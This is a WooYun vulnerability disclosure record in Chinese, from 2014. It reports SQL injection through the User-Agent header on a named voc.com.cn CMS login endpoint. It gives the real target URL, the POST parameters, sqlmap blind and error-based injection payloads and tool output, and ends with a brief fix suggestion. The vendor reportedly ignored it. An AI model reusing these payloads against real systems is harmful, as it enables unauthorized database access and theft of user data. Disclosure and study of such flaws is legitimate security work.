{"id": 49099, "wybug_id": "wooyun-2014-080362", "wybug_title": "华声在线某CMS系统注入", "wybug_corp": "华声在线", "wybug_author": "路人甲", "wybug_date": "2014-10-22 15:03", "wybug_open_date": "2014-12-06 15:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： CMS系统存在系统注入漏洞，可以通过该漏洞导出华声论坛数据。 详细说明：  http://cms.voc.com.cn/voccgi/app/mobile/bbsapi/wxhn_login.php该文件会调用bbs.voc.com.cn论坛接口，将用户User-Agent作为参数传递，但是接口没有对User-Agent传入数据做转义处理，导致恶意用户可以注入。   漏洞证明：  修改UA后返回MySQL错误信息\n\nMySQL注入\n\n数据库\n\n注入点：http://cms.voc.com.cn/voccgi/app/mobile/bbsapi/wxhn_login.php (POST)username=13800000000&type=0&password=123456&userid=903803006541270965&channelId=4179589380995243418注入语句：Place: User-AgentParameter: User-Agent    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sqlmap/1.0-dev-35ed668 (http://sqlmap.org)'||(SELECT 'vfPO' FROM DUAL WHERE 5810=5810 AND 5919=5919)||'    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clauseroot@localhost:~/.sqlmap/output/cms.voc.com.cn# head -n 20 log sqlmap identified the following injection points with a total of 60595 HTTP(s) requests:   修复方案：  修改wxhn_login.php接口代码，对User-Agent字段加入SQL注入过滤代码。修改bbs.voc.com.cn/api/web/webapi.php文件，加入注入过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}